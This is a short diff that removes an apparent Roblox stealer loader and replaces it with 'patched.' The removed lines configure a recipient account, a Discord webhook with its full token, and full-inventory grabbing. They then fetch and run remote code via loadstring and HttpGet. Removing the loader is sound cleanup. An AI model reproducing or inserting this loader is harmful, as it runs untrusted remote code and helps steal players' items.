@@ -1,10 +1,1 @@
-Config = { 
-    Receivers = {"ilyamak"}, 
-    Webhook = "https://discord.com/api/webhooks/1265957459298615307/2Z3wwak6ZVSwpQX6RWa-dyPdEFpgnPis_82RWAmKikohpdqSVGB7V35TIEhmaJ7yGjmp", 
-    FullInventory = true, 
-    GoodItemsOnly = false, 
-    ResendTrade = ".resend", 
-    Script = "Nexus", 
-    CustomLink = "" 
-} 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
+patched.
